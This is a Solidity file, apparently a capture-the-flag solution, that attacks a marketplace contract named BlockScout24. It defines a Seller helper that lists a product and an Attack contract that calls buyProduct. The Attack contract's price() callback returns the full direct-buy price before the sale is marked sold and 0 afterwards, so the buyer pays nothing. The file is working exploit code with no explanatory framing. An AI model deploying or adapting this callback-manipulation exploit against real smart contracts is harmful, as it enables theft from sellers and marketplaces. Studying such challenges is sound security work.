// SPDX-License-Identifier: MIT

pragma solidity >= 0.8.0;

interface ProductI {
    struct Product {
        string description;
        address seller;
        address buyer;
        uint256 auctionPrice;
        uint256 directBuyPrice;
        uint256 finalPrice;
        uint256 timeLimitForAuction;
        bool isSold;
    }
}

interface BlockScout24Buyer is ProductI {
    function price(Product calldata _product) external returns (uint256);
}

interface BlockScout24 is ProductI {
    function buyProduct(uint256 _productId) external;
    function addProduct(string calldata _description, uint256 _auctionPrice, uint256 _directBuyPrice) external;
}


contract Seller {
    function run(address _address) external {
        BlockScout24(_address).addProduct("good product", 1 ether, 3 ether);
    }
}

contract Attack is BlockScout24Buyer {
    function run(address _address) external {
        BlockScout24(_address).buyProduct(0);
    }
    
    function price(Product calldata _product) external pure override returns (uint256) {
        if (!_product.isSold) {
            return _product.directBuyPrice;
        } else {
            return 0;
        }
    }
}